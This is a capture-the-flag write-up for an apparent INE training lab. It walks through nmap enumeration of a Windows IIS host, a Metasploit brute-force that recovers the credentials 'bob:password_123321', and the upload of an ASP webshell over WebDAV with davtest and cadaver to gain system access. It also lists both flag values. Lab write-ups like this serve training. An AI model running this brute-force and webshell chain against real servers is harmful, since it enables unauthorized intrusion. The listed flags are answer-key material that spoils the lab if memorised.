# Target Info
*Domain*: target1.ine.local
*IP*: 10.5.22.124

# flags
1) *flag1*:`25b60acd1b214d7c84f6b695cfa50103`
2) *flag2*: `754d7974ea844ff2a41d12b027ff85c0`

# Enumeration

## Nmap Scan
### *Port Scan*

```shell
$ sudo nmap --min-rate 10000 -p-  -sV target1.ine.local
	
	Not shown: 65516 closed tcp ports (reset)
	PORT      STATE    SERVICE       VERSION
	80/tcp    open     http          Microsoft IIS httpd 10.0
	135/tcp   open     msrpc         Microsoft Windows RPC
	139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open     microsoft-ds?
	3389/tcp  open     ms-wbt-server Microsoft Terminal Services
	5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	7412/tcp  filtered unknown
	20468/tcp filtered unknown
	44064/tcp filtered unknown
	47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	49664/tcp open     msrpc         Microsoft Windows RPC
	49665/tcp open     msrpc         Microsoft Windows RPC
	49666/tcp open     msrpc         Microsoft Windows RPC
	49667/tcp open     msrpc         Microsoft Windows RPC
	49668/tcp open     msrpc         Microsoft Windows RPC
	49670/tcp open     msrpc         Microsoft Windows RPC
	49684/tcp open     msrpc         Microsoft Windows RPC
	49706/tcp open     msrpc         Microsoft Windows RPC
	60500/tcp filtered unknown

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
### *Service Enumeration*

```shell
$ sudo nmap -sS -sV -A -T4 target1.ine.local -oX scan.xml 
	
	Host is up (0.0022s latency).
	Not shown: 995 closed tcp ports (reset)
	
	PORT     STATE SERVICE       VERSION
	
	80/tcp   open  http          Microsoft IIS httpd 10.0
	| http-auth: 
	| HTTP/1.1 401 Unauthorized\x0D
	|_  Basic realm=target1.ine.local
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
	
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds?
	
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	|_ssl-date: 2025-05-12T18:48:20+00:00; 0s from scanner time.
	| rdp-ntlm-info: 
	|   Target_Name: EC2AMAZ-JVD17HK
	|   NetBIOS_Domain_Name: EC2AMAZ-JVD17HK
	|   NetBIOS_Computer_Name: EC2AMAZ-JVD17HK
	|   DNS_Domain_Name: EC2AMAZ-JVD17HK
	|   DNS_Computer_Name: EC2AMAZ-JVD17HK
	|   Product_Version: 10.0.17763
	|_  System_Time: 2025-05-12T18:48:13+00:00
	| ssl-cert: Subject: commonName=EC2AMAZ-JVD17HK
	| Not valid before: 2024-12-31T07:25:48
	|_Not valid after:  2025-07-02T07:25:48
	
	Network Distance: 3 hops
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2025-05-12T18:48:14
	|_  start_date: N/A

```
# Exploitation

## Usefull Wordlists

```shell
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/webshells/asp/webshell.asp
```

## http login
```shell
# metasploit
# search http_login
use auxiliary/scanner/http/http_login
set rhosts target1.ine.local
set user_file user # make a file named user with keyword bob
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set THREADS 10
set PASS_FILE 
run

[+] 10.5.22.124:80 - Success: 'bob:password_123321'

# flag 1
# login with cracked username - password and go to this url
-> http://target1.ine.local/webdav/flag1.txt
```
## Exploiting Webdav
```shell
# copy webshell
cp /usr/share/webshells/asp/webshell.asp shell.asp

# davtest
- davtest -url http://target1.ine.local/webdav -auth bob:password_123321
	# asp webshell upload
	PUT     asp     SUCCEED:        http://target1.ine.local/webdav/DavTestDir_gWC9JuPrFWIDfqM/davtest_gWC9JuPrFWIDfqM.asp
	# execute
	EXEC    asp     SUCCEED:        http://target1.ine.local/webdav/DavTestDir_gWC9JuPrFWIDfqM/davtest_gWC9JuPrFWIDfqM.asp

# now login with cadaver and upload shell.asp 
- cadaver  http://target1.ine.local/webdav
- put shell.asp

# now browse and go for shell.asp
-> http://target1.ine.local/webdav/shell.asp # got webshell and got system access
more C:\\flag2.txt

```